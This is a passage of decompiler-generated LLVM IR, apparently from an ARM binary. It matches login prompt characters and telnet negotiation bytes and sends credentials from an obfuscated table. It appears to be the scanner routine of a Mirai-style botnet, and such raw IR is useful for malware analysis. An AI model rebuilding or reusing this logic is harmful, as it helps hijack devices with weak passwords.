  %v7_eb9c = icmp eq i8 %v3_eb98, 62
  store i1 %v7_eb9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb9c, label %dec_label_pc_eba8, label %bb407

bb407:                                            ; preds = %dec_label_pc_eb98
  %v3_eba0 = icmp ugt i8 %v3_eb98, 57
  store i1 %v3_eba0, i1* %cpsr_c.global-to-local, align 1
  %v8_eba0 = icmp eq i8 %v3_eb98, 58
  store i1 %v8_eba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eba0, label %dec_label_pc_eba8, label %dec_label_pc_eb74

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb98, %bb407, %dec_label_pc_eb84, %dec_label_pc_eb7c, %dec_label_pc_eb74, %dec_label_pc_eb60, %dec_label_pc_eb3c, %dec_label_pc_eb58, %dec_label_pc_eb50, %bb406
  %v0_ebac = phi i32 [ %v1_eb30, %dec_label_pc_eb60 ], [ %v1_eb30, %dec_label_pc_eb3c ], [ %v1_eb30, %dec_label_pc_eb58 ], [ %v1_eb30, %dec_label_pc_eb50 ], [ %v1_eb30, %bb406 ], [ %v1_eb90, %dec_label_pc_eb74 ], [ %v1_eb90, %dec_label_pc_eb7c ], [ %v1_eb90, %dec_label_pc_eb84 ], [ %v1_eb90, %bb407 ], [ %v1_eb90, %dec_label_pc_eb98 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_ebac = add i32 %v0_ebac, 1
  store i32 %v1_ebac, i32* @r7, align 4
  %v1_ebb0 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_ebc0 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_ebc0, i32* %r0.global-to-local, align 4
  %v3_ebc4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ebc4, i32* %r2.global-to-local, align 4
  store i32 %v3_ebc0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r5, align 4
  %v1_ebd0 = add i32 %v0_ebd0, 4
  %v2_ebd0 = inttoptr i32 %v1_ebd0 to i32*
  %v3_ebd0 = load i32, i32* %v2_ebd0, align 4
  store i32 %v3_ebd0, i32* %r0.global-to-local, align 4
  %v4_ebd4 = call i32 @__libc_send(i32 %v3_ebd0, i32 %v3_ebc0, i32 %v3_ebc4, i32 16384)
  store i32 %v4_ebd4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebe4 = load i32, i32* @r5, align 4
  %v1_ebe4 = add i32 %v0_ebe4, 4
  %v2_ebe4 = inttoptr i32 %v1_ebe4 to i32*
  %v3_ebe4 = load i32, i32* %v2_ebe4, align 4
  store i32 %v3_ebe4, i32* %r0.global-to-local, align 4
  %v4_ebe8 = call i32 @__libc_send(i32 %v3_ebe4, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_ebf0 = call i32 @table_lock_val(i32 5)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ebf8 = load i32, i32* @r5, align 4
  %v2_ebf8 = add i32 %v1_ebf8, 12
  %v3_ebf8 = inttoptr i32 %v2_ebf8 to i32*
  store i32 6, i32* %v3_ebf8, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_ec00:                                ; preds = %dec_label_pc_e694
  %v1_ec00 = add i32 %v0_e694, 24
  %v2_ec00 = inttoptr i32 %v1_ec00 to i32*
  %v3_ec00 = load i32, i32* %v2_ec00, align 4
  store i32 %v3_ec00, i32* %r2.global-to-local, align 4
  %v1_ec04 = add i32 %v3_ec00, -1
  store i32 %v1_ec04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec08 = icmp eq i32 %v1_ec04, 0
  store i1 %v2_ec08, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v1_ec04, 1
  br i1 %tmp408, label %dec_label_pc_ec7c, label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ec00
  %v2_ec10 = add i32 %v1_ec04, %v0_e694
  store i32 %v2_ec10, i32* %r3.global-to-local, align 4
  %v1_ec14 = add i32 %v2_ec10, 28
  %v2_ec14 = inttoptr i32 %v1_ec14 to i8*
  %v3_ec14 = load i8, i8* %v2_ec14, align 1
  %v4_ec14 = zext i8 %v3_ec14 to i32
  store i32 %v4_ec14, i32* %r3.global-to-local, align 4
  %v2_ec18 = icmp ugt i8 %v3_ec14, 61
  store i1 %v2_ec18, i1* %cpsr_c.global-to-local, align 1
  %v7_ec18 = icmp eq i8 %v3_ec14, 62
  store i1 %v7_ec18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec18, label %dec_label_pc_ef34, label %bb409

bb409:                                            ; preds = %dec_label_pc_ec10
  %v3_ec1c = icmp ugt i8 %v3_ec14, 57
  store i1 %v3_ec1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ec1c = icmp eq i8 %v3_ec14, 58
  store i1 %v8_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec1c, label %dec_label_pc_ef34, label %dec_label_pc_ec24

dec_label_pc_ec24:                                ; preds = %bb409
  %v2_ec24 = icmp ugt i8 %v3_ec14, 35
  store i1 %v2_ec24, i1* %cpsr_c.global-to-local, align 1
  %v7_ec24 = icmp eq i8 %v3_ec14, 36
  store i1 %v7_ec24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec24, label %dec_label_pc_ef34, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec24
  %v2_ec2c = icmp ugt i8 %v3_ec14, 34
  store i1 %v2_ec2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec2c = icmp eq i8 %v3_ec14, 35
  store i1 %v7_ec2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec2c, label %dec_label_pc_ef34, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec2c
  %v2_ec34 = icmp ugt i8 %v3_ec14, 36
  store i1 %v2_ec34, i1* %cpsr_c.global-to-local, align 1
  %v7_ec34 = icmp eq i8 %v3_ec14, 37
  store i1 %v7_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec34, label %dec_label_pc_ef34, label %dec_label_pc_ec74.preheader

dec_label_pc_ec74.preheader:                      ; preds = %dec_label_pc_ec34
  %v3_ec38 = add i32 %v0_e694, 28
  %v2_ec3c = add i32 %v3_ec38, %v3_ec00
  store i32 %v2_ec3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec74

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec74
  %v1_ec48 = add i32 %v0_ec6c, -2
  %v2_ec48 = inttoptr i32 %v1_ec48 to i8*
  %v3_ec48 = load i8, i8* %v2_ec48, align 1
  %v4_ec48 = zext i8 %v3_ec48 to i32
  store i32 %v4_ec48, i32* %r2.global-to-local, align 4
  %v2_ec4c = icmp ugt i8 %v3_ec48, 61
  store i1 %v2_ec4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec4c = icmp eq i8 %v3_ec48, 62
  store i1 %v7_ec4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec4c, label %dec_label_pc_ef34, label %bb410

bb410:                                            ; preds = %dec_label_pc_ec48
  %v3_ec50 = icmp ugt i8 %v3_ec48, 57
  store i1 %v3_ec50, i1* %cpsr_c.global-to-local, align 1
  %v8_ec50 = icmp eq i8 %v3_ec48, 58
  store i1 %v8_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec50, label %dec_label_pc_ef34, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %bb410
  %v2_ec58 = icmp ugt i8 %v3_ec48, 35
  store i1 %v2_ec58, i1* %cpsr_c.global-to-local, align 1
  %v7_ec58 = icmp eq i8 %v3_ec48, 36
  store i1 %v7_ec58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec58, label %dec_label_pc_ef34, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec58
  %v2_ec60 = icmp ugt i8 %v3_ec48, 34
  store i1 %v2_ec60, i1* %cpsr_c.global-to-local, align 1
  %v7_ec60 = icmp eq i8 %v3_ec48, 35
  store i1 %v7_ec60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec60, label %dec_label_pc_ef34, label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec60
  %v2_ec68 = icmp ugt i8 %v3_ec48, 36
  store i1 %v2_ec68, i1* %cpsr_c.global-to-local, align 1
  %v7_ec68 = icmp eq i8 %v3_ec48, 37
  store i1 %v7_ec68, i1* %cpsr_z.global-to-local, align 1
  %v1_ec6c = add i32 %v0_ec6c, -1
  store i32 %v1_ec6c, i32* %r3.global-to-local, align 4
  br i1 %v7_ec68, label %dec_label_pc_ef34, label %dec_label_pc_ec74

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec74.preheader, %dec_label_pc_ec68
  %v0_ec6c = phi i32 [ %v2_ec3c, %dec_label_pc_ec74.preheader ], [ %v1_ec6c, %dec_label_pc_ec68 ]
  %v0_ec74 = phi i32 [ %v1_ec04, %dec_label_pc_ec74.preheader ], [ %v1_ec74, %dec_label_pc_ec68 ]
  %v1_ec74 = add i32 %v0_ec74, -1
  store i32 %v1_ec74, i32* %r0.global-to-local, align 4
  %v2_ec74 = icmp ne i32 %v0_ec74, 0
  store i1 %v2_ec74, i1* %cpsr_c.global-to-local, align 1
  %v7_ec74 = icmp eq i32 %v0_ec74, 1
  store i1 %v7_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec74, label %dec_label_pc_ec7c, label %dec_label_pc_ec48

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec74, %dec_label_pc_ec00
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_ec80 = call i32 @table_unlock_val(i32 12)
  store i32 13, i32* %r0.global-to-local, align 4
  %v1_ec88 = call i32 @table_unlock_val(i32 13)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_ec98 = call i32 @table_retrieve_val(i32 12, i32* nonnull %stack_var_-60)
  store i32 %v3_ec98, i32* @r4, align 4
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r0.global-to-local, align 4
  %v3_ecac = call i32 @table_retrieve_val(i32 13, i32* %v2_ecac)
  %v3_ecb0 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_ecac, 16777216
  %v1_ecb4 = sdiv i32 %sext, 16777216
  store i32 %v1_ecb4, i32* @r6, align 4
  %v0_ecb8 = load i32, i32* @r4, align 4
  store i32 %v0_ecb8, i32* %r2.global-to-local, align 4
  %v1_ecbc = add i32 %v3_ecb0, -1
  store i32 %v1_ecbc, i32* %r3.global-to-local, align 4
  %v0_ecc0 = load i32, i32* @sl, align 4
  store i32 %v0_ecc0, i32* %r0.global-to-local, align 4
  %v0_ecc4 = load i32, i32* @r5, align 4
  %v1_ecc4 = add i32 %v0_ecc4, 24
  %v2_ecc4 = inttoptr i32 %v1_ecc4 to i32*
  %v3_ecc4 = load i32, i32* %v2_ecc4, align 4
  store i32 %v3_ecc4, i32* %r1.global-to-local, align 4
  %v4_ecc8 = call i32 @util_memsearch(i32 %v0_ecc0, i32 %v3_ecc4, i32 %v0_ecb8, i32 %v1_ecbc)
  store i32 %v4_ecc8, i32* %r0.global-to-local, align 4
  %v2_eccc = icmp eq i32 %v4_ecc8, -1
  store i1 %v2_eccc, i1* %cpsr_c.global-to-local, align 1
  %v7_eccc = icmp eq i32 %v4_ecc8, -1
  store i1 %v7_eccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eccc, label %dec_label_pc_f070, label %dec_label_pc_ecdc

dec_label_pc_ecdc:                                ; preds = %dec_label_pc_f070, %dec_label_pc_ec7c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_ece0 = call i32 @table_lock_val(i32 12)
  store i32 13, i32* %r0.global-to-local, align 4
  %v1_ece8 = call i32 @table_lock_val(i32 13)
  store i32 %v1_ece8, i32* %r0.global-to-local, align 4
  %v0_ecec = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecec = icmp eq i32 %v0_ecec, 0
  store i1 %v2_ecec, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_ecec, 1
  br i1 %tmp411, label %dec_label_pc_ede0, label %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge

dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge:    ; preds = %dec_label_pc_ecdc
  %v0_ef38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ef38

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_e694
  %v1_ecf8 = add i32 %v0_e694, 24
  %v2_ecf8 = inttoptr i32 %v1_ecf8 to i32*
  %v3_ecf8 = load i32, i32* %v2_ecf8, align 4
  store i32 %v3_ecf8, i32* %r2.global-to-local, align 4
  %v1_ecfc = add i32 %v3_ecf8, -1
  store i32 %v1_ecfc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed00 = icmp eq i32 %v1_ecfc, 0
  store i1 %v2_ed00, i1* %cpsr_z.global-to-local, align 1
  %tmp412 = icmp slt i32 %v1_ecfc, 1
  br i1 %tmp412, label %dec_label_pc_ed64, label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ecf8
  %v2_ed08 = add i32 %v1_ecfc, %v0_e694
  store i32 %v2_ed08, i32* %r3.global-to-local, align 4
  %v1_ed0c = add i32 %v2_ed08, 28
  %v2_ed0c = inttoptr i32 %v1_ed0c to i8*
  %v3_ed0c = load i8, i8* %v2_ed0c, align 1
  %v4_ed0c = zext i8 %v3_ed0c to i32
  store i32 %v4_ed0c, i32* %r3.global-to-local, align 4
  %v2_ed10 = icmp ugt i8 %v3_ed0c, 61
  store i1 %v2_ed10, i1* %cpsr_c.global-to-local, align 1
  %v7_ed10 = icmp eq i8 %v3_ed0c, 62
  store i1 %v7_ed10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed10, label %dec_label_pc_ef2c, label %bb413

bb413:                                            ; preds = %dec_label_pc_ed08
  %v3_ed14 = icmp ugt i8 %v3_ed0c, 57
  store i1 %v3_ed14, i1* %cpsr_c.global-to-local, align 1
  %v8_ed14 = icmp eq i8 %v3_ed0c, 58
  store i1 %v8_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ed14, label %dec_label_pc_ef2c, label %dec_label_pc_ed1c

dec_label_pc_ed1c:                                ; preds = %bb413
  %v2_ed1c = icmp ugt i8 %v3_ed0c, 35
  store i1 %v2_ed1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed1c = icmp eq i8 %v3_ed0c, 36
  store i1 %v7_ed1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed1c, label %dec_label_pc_ef2c, label %dec_label_pc_ed24

dec_label_pc_ed24:                                ; preds = %dec_label_pc_ed1c
  %v2_ed24 = icmp ugt i8 %v3_ed0c, 34
  store i1 %v2_ed24, i1* %cpsr_c.global-to-local, align 1
  %v7_ed24 = icmp eq i8 %v3_ed0c, 35
  store i1 %v7_ed24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed24, label %dec_label_pc_ef2c, label %dec_label_pc_ed5c.preheader

dec_label_pc_ed5c.preheader:                      ; preds = %dec_label_pc_ed24
  %v3_ed28 = add i32 %v0_e694, 28
  %v2_ed2c = add i32 %v3_ed28, %v3_ecf8
  store i32 %v2_ed2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed5c
  %v1_ed38 = add i32 %v0_ed54, -2
  %v2_ed38 = inttoptr i32 %v1_ed38 to i8*
  %v3_ed38 = load i8, i8* %v2_ed38, align 1
  %v4_ed38 = zext i8 %v3_ed38 to i32
  store i32 %v4_ed38, i32* %r2.global-to-local, align 4
  %v2_ed3c = icmp ugt i8 %v3_ed38, 61
  store i1 %v2_ed3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c = icmp eq i8 %v3_ed38, 62
  store i1 %v7_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c, label %dec_label_pc_ef2c, label %bb414

bb414:                                            ; preds = %dec_label_pc_ed38
  %v3_ed40 = icmp ugt i8 %v3_ed38, 57
  store i1 %v3_ed40, i1* %cpsr_c.global-to-local, align 1
  %v8_ed40 = icmp eq i8 %v3_ed38, 58
  store i1 %v8_ed40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ed40, label %dec_label_pc_ef2c, label %dec_label_pc_ed48

dec_label_pc_ed48:                                ; preds = %bb414
  %v2_ed48 = icmp ugt i8 %v3_ed38, 35
  store i1 %v2_ed48, i1* %cpsr_c.global-to-local, align 1
  %v7_ed48 = icmp eq i8 %v3_ed38, 36
  store i1 %v7_ed48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed48, label %dec_label_pc_ef2c, label %dec_label_pc_ed50

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed48
  %v2_ed50 = icmp ugt i8 %v3_ed38, 34
  store i1 %v2_ed50, i1* %cpsr_c.global-to-local, align 1
  %v7_ed50 = icmp eq i8 %v3_ed38, 35
  store i1 %v7_ed50, i1* %cpsr_z.global-to-local, align 1
  %v1_ed54 = add i32 %v0_ed54, -1
  store i32 %v1_ed54, i32* %r3.global-to-local, align 4
  br i1 %v7_ed50, label %dec_label_pc_ef2c, label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed5c.preheader, %dec_label_pc_ed50
  %v0_ed54 = phi i32 [ %v2_ed2c, %dec_label_pc_ed5c.preheader ], [ %v1_ed54, %dec_label_pc_ed50 ]
  %v0_ed5c = phi i32 [ %v1_ecfc, %dec_label_pc_ed5c.preheader ], [ %v1_ed5c, %dec_label_pc_ed50 ]
  %v1_ed5c = add i32 %v0_ed5c, -1
  store i32 %v1_ed5c, i32* %r0.global-to-local, align 4
  %v2_ed5c = icmp ne i32 %v0_ed5c, 0
  store i1 %v2_ed5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed5c = icmp eq i32 %v0_ed5c, 1
  store i1 %v7_ed5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed5c, label %dec_label_pc_ed64, label %dec_label_pc_ed38

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed5c, %dec_label_pc_ecf8
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_ed68 = call i32 @table_unlock_val(i32 11)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_ed78 = call i32 @table_retrieve_val(i32 11, i32* %v2_ecac)
  %v3_ed7c = load i8, i8* %stack_var_-56, align 1
  %v4_ed7c = sext i8 %v3_ed7c to i32
  store i32 %v3_ed78, i32* %r2.global-to-local, align 4
  %v1_ed84 = add nsw i32 %v4_ed7c, -1
  store i32 %v1_ed84, i32* %r3.global-to-local, align 4
  %v0_ed88 = load i32, i32* @sl, align 4
  store i32 %v0_ed88, i32* %r0.global-to-local, align 4
  %v0_ed8c = load i32, i32* @r5, align 4
  %v1_ed8c = add i32 %v0_ed8c, 24
  %v2_ed8c = inttoptr i32 %v1_ed8c to i32*
  %v3_ed8c = load i32, i32* %v2_ed8c, align 4
  store i32 %v3_ed8c, i32* %r1.global-to-local, align 4
  %v4_ed90 = call i32 @util_memsearch(i32 %v0_ed88, i32 %v3_ed8c, i32 %v3_ed78, i32 %v1_ed84)
  store i32 %v4_ed90, i32* %r0.global-to-local, align 4
  %v1_ed94 = add i32 %v4_ed90, 1
  store i32 %v1_ed94, i32* @r7, align 4
  %v2_ed94 = icmp eq i32 %v4_ed90, -1
  store i1 %v2_ed94, i1* %cpsr_c.global-to-local, align 1
  %v7_ed94 = icmp eq i32 %v1_ed94, 0
  store i1 %v7_ed94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed94, label %thread-pre-split103, label %bb415

bb415:                                            ; preds = %dec_label_pc_ed64
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_ed64, %bb415
  %v0_ed9c = phi i1 [ false, %bb415 ], [ true, %dec_label_pc_ed64 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_ed9c, i1* %cpsr_z.global-to-local, align 1
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f1a0 = call i32 @table_lock_val(i32 11)
  store i32 %v1_f1a0, i32* %r0.global-to-local, align 4
  %v0_f1a4 = load i32, i32* @r5, align 4
  br i1 %v0_ed9c, label %dec_label_pc_f19c, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %thread-pre-split103, %dec_label_pc_ef2c
  %v0_edac = phi i32 [ %v0_e694, %dec_label_pc_ef2c ], [ %v0_f1a4, %thread-pre-split103 ]
  %v1_edac = inttoptr i32 %v0_edac to i32*
  %v2_edac = load i32, i32* %v1_edac, align 4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = add i32 %v0_edac, 4
  %v2_edb0 = inttoptr i32 %v1_edb0 to i32*
  %v3_edb0 = load i32, i32* %v2_edb0, align 4
  store i32 %v3_edb0, i32* %r0.global-to-local, align 4
  %v1_edb4 = add i32 %v2_edac, 13
  %v2_edb4 = inttoptr i32 %v1_edb4 to i8*
  %v3_edb4 = load i8, i8* %v2_edb4, align 1
  %v4_edb4 = zext i8 %v3_edb4 to i32
  store i32 %v4_edb4, i32* %r2.global-to-local, align 4
  %v1_edb8 = add i32 %v2_edac, 4
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  store i32 %v3_edb8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_edc0 = call i32 @__libc_send(i32 %v3_edb0, i32 %v3_edb8, i32 %v4_edb4, i32 16384)
  store i32 %v4_edc0, i32* %r0.global-to-local, align 4
  %v0_edc4 = load i32, i32* @r5, align 4
  %v1_edc4 = add i32 %v0_edc4, 4
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  %v3_edc4 = load i32, i32* %v2_edc4, align 4
  store i32 %v3_edc4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_edd4 = call i32 @__libc_send(i32 %v3_edc4, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_eddc = load i32, i32* @r5, align 4
  %v2_eddc = add i32 %v1_eddc, 12
  %v3_eddc = inttoptr i32 %v2_eddc to i32*
  store i32 5, i32* %v3_eddc, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_eeac, %bb419, %dec_label_pc_ecdc, %dec_label_pc_efbc, %dec_label_pc_ef38, %dec_label_pc_f000, %dec_label_pc_edac
  %v0_ede0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ede0 = icmp eq i32 %v0_ede0, 0
  store i1 %v2_ede0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ede0, label %dec_label_pc_e614.loopexit, label %dec_label_pc_e7b4

dec_label_pc_edec:                                ; preds = %dec_label_pc_e694
  %v1_edec = add i32 %v0_e694, 24
  %v2_edec = inttoptr i32 %v1_edec to i32*
  %v3_edec = load i32, i32* %v2_edec, align 4
  store i32 %v3_edec, i32* %r2.global-to-local, align 4
  %v0_edf0 = load i32, i32* @sl, align 4
  store i32 %v0_edf0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_edf8146 = icmp eq i32 %v3_edec, 0
  store i1 %v3_edf8146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_edf8146, i1* %cpsr_z.global-to-local, align 1
  %v6_edfc153 = icmp sgt i32 %v3_edec, 0
  br i1 %v6_edfc153, label %dec_label_pc_ee00.preheader, label %dec_label_pc_eeac

dec_label_pc_edf8.loopexit:                       ; preds = %dec_label_pc_ee1c
  %v2_ee24 = add i32 %v1_ee24, 2
  store i32 %v2_ee24, i32* @r4, align 4
  %v2_ee28 = add i32 %v1_ee28, 2
  store i32 %v2_ee28, i32* @r7, align 4
  %v3_edf8 = icmp uge i32 %v2_ee28, %v1_edf8
  store i1 %v3_edf8, i1* %cpsr_c.global-to-local, align 1
  %v9_edf8 = icmp eq i32 %v2_ee28, %v1_edf8
  store i1 %v9_edf8, i1* %cpsr_z.global-to-local, align 1
  %v6_edfc = icmp slt i32 %v2_ee28, %v1_edf8
  br i1 %v6_edfc, label %dec_label_pc_ee00.preheader, label %dec_label_pc_eeac

dec_label_pc_ee00.preheader:                      ; preds = %dec_label_pc_edec, %dec_label_pc_edf8.loopexit
  %v6_eeb4239 = phi i32 [ %v6_eeb4240, %dec_label_pc_edf8.loopexit ], [ %v0_e694, %dec_label_pc_edec ]
  %v1_ee28222 = phi i32 [ %v2_ee28, %dec_label_pc_edf8.loopexit ], [ 0, %dec_label_pc_edec ]
  %v1_ee0c220 = phi i32 [ %v1_edf8, %dec_label_pc_edf8.loopexit ], [ %v3_edec, %dec_label_pc_edec ]
  %v0_ee00218 = phi i32 [ %v2_ee24, %dec_label_pc_edf8.loopexit ], [ %v0_edf0, %dec_label_pc_edec ]
  br label %dec_label_pc_ee00

dec_label_pc_ee00:                                ; preds = %dec_label_pc_ee00.preheader, %dec_label_pc_ee90
  %v6_eeb4240 = phi i32 [ %v6_eeb4239, %dec_label_pc_ee00.preheader ], [ %v0_ee98, %dec_label_pc_ee90 ]
  %v1_ee28 = phi i32 [ %v1_ee28222, %dec_label_pc_ee00.preheader ], [ %v1_ee9c, %dec_label_pc_ee90 ]
  %v1_edf8 = phi i32 [ %v1_ee0c220, %dec_label_pc_ee00.preheader ], [ %v3_ee98, %dec_label_pc_ee90 ]
  %v1_ee24 = phi i32 [ %v0_ee00218, %dec_label_pc_ee00.preheader ], [ %v1_eea4, %dec_label_pc_ee90 ]
  %v1_ee00 = inttoptr i32 %v1_ee24 to i8*
  %v2_ee00 = load i8, i8* %v1_ee00, align 1
  %v3_ee00 = zext i8 %v2_ee00 to i32
  store i32 %v3_ee00, i32* @r3, align 4
  %v2_ee04 = icmp eq i8 %v2_ee00, -1
  store i1 %v2_ee04, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ee04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee04, label %dec_label_pc_ee0c, label %dec_label_pc_eeac

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_ee00
  %v0_ee0c = load i32, i32* @sl, align 4
  %v2_ee0c = add i32 %v0_ee0c, %v1_edf8
  store i32 %v2_ee0c, i32* %r1.global-to-local, align 4
  %v1_ee10 = add i32 %v1_ee24, 1
  store i32 %v1_ee10, i32* @r6, align 4
  %v3_ee14 = icmp uge i32 %v2_ee0c, %v1_ee10
  store i1 %v3_ee14, i1* %cpsr_c.global-to-local, align 1
  %v9_ee14 = icmp eq i32 %v2_ee0c, %v1_ee10
  store i1 %v9_ee14, i1* %cpsr_z.global-to-local, align 1
  %v2_ee18 = xor i1 %v3_ee14, true
  %v3_ee18 = or i1 %v9_ee14, %v2_ee18
  br i1 %v3_ee18, label %dec_label_pc_eeac, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee0c
  %v2_ee1c = inttoptr i32 %v1_ee10 to i8*
  %v3_ee1c = load i8, i8* %v2_ee1c, align 1
  %v4_ee1c = zext i8 %v3_ee1c to i32
  store i32 %v4_ee1c, i32* @r3, align 4
  %v2_ee20 = icmp eq i8 %v3_ee1c, -1
  store i1 %v2_ee20, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ee20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee20, label %dec_label_pc_edf8.loopexit, label %dec_label_pc_ee30

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ee1c
  %v2_ee30 = icmp ugt i8 %v3_ee1c, -4
  store i1 %v2_ee30, i1* %cpsr_c.global-to-local, align 1
  %v7_ee30 = icmp eq i8 %v3_ee1c, -3
  store i1 %v7_ee30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee30, label %dec_label_pc_eebc, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %dec_label_pc_ee30
  %v1_ee38 = add i32 %v1_ee24, 2
  store i32 %v1_ee38, i32* @r3, align 4
  %v3_ee3c = icmp uge i32 %v2_ee0c, %v1_ee38
  store i1 %v3_ee3c, i1* %cpsr_c.global-to-local, align 1
  %v9_ee3c = icmp eq i32 %v2_ee0c, %v1_ee38
  store i1 %v9_ee3c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee40 = xor i1 %v3_ee3c, true
